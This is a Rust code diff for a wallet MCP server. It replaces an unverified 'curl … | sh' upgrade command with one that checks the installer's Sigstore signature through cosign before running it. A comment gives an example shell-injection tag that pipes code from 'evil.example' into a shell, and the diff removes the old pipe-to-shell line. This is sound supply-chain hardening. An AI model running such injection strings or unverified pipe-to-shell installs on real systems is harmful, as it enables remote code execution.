@@ -120,6 +120,44 @@ the wallet. Do not retry, and do not tell the user to upgrade."
 
 /// A release tag, as it may be spliced into a URL and a shell command.
 ///
+/// The command an agent may be asked to run to install a newer release.
+///
+/// It used to be `curl … /install.sh | sh`. `install.sh` verifies everything it
+/// downloads — the archive against `SHA256SUMS`, `SHA256SUMS` against a keyless
+/// Sigstore bundle, refusing rather than downgrading when either is missing —
+/// but nothing verified `install.sh`. It was fetched from the raw source tree
+/// at a tag, and a shell begins executing a piped script as it arrives, so
+/// every check inside it ran only if whoever chose those bytes wanted it to.
+/// Verifying the payload with a script the same party could replace proves
+/// nothing, and the release workflow signed the archives it names but not the
+/// script itself.
+///
+/// So the installer is now a signed release asset and this downloads it, checks
+/// its bundle against the release workflow's identity at this exact tag, and
+/// runs it only if `cosign` says the bytes are the ones that workflow produced.
+/// No `cosign`, no install: that is the same refusal `install.sh` already makes
+/// about its own downloads, applied one step earlier to itself.
+///
+/// `&&` throughout rather than `;`, so a failed download or a failed
+/// verification stops the sequence instead of falling through to `sh`. The tag
+/// and repository are interpolated into a shell command and are validated by
+/// [`valid_tag`] and [`valid_repository`] before reaching here.
+fn upgrade_command(repository: &str, tag: &str) -> String {
+    let asset = format!("https://github.com/{repository}/releases/download/{tag}");
+    let identity =
+        format!("https://github.com/{repository}/.github/workflows/release.yml@refs/tags/{tag}");
+    format!(
+        "d=$(mktemp -d) && \
+curl -fsSL -o \"$d/install.sh\" {asset}/install.sh && \
+curl -fsSL -o \"$d/install.sh.sigstore.json\" {asset}/install.sh.sigstore.json && \
+cosign verify-blob --bundle \"$d/install.sh.sigstore.json\" \
+--certificate-identity {identity} \
+--certificate-oidc-issuer https://token.actions.githubusercontent.com \
+\"$d/install.sh\" && \
+sh \"$d/install.sh\""
+    )
+}
+
 /// The tag arrives over the network and leaves in `upgrade_command`, which an
 /// agent is told it may run. Nothing downstream re-checks it, so a tag of
 /// `v1.0.0; curl evil.example | sh` would be a shell injection with a network
@@ -343,7 +381,7 @@ where
 ask you to. That command installs over the binary this server is running from; the running \
 process keeps the version it started with, so after it succeeds tell the user to restart the \
 wallet MCP server — in Claude Code, /mcp then reconnect ekubo-wallet — for the new version to \
-take effect. This wallet cannot update itself and has no tool that does."
+take effect. This wallet cannot update itself and has no tool that does. The command verifies the installer's Sigstore signature before running it and stops if that fails; do not edit it to skip the verification, and do not substitute a shorter one-liner that pipes the script straight into a shell."
             .to_string()
     } else {
         "This build is the latest published release. Say so if asked; there is nothing to do."
@@ -355,11 +393,7 @@ take effect. This wallet cannot update itself and has no tool that does."
         latest_version: Some(tag.clone()),
         update_available,
         release_url: Some(release_url),
-        upgrade_command: update_available.then(|| {
-            format!(
-                "curl -fsSL https://raw.githubusercontent.com/{repository}/{tag}/install.sh | sh"
-            )
-        }),
+        upgrade_command: update_available.then(|| upgrade_command(repository, &tag)),
         checked_at: Some(checked_at),
         source,
         instruction,
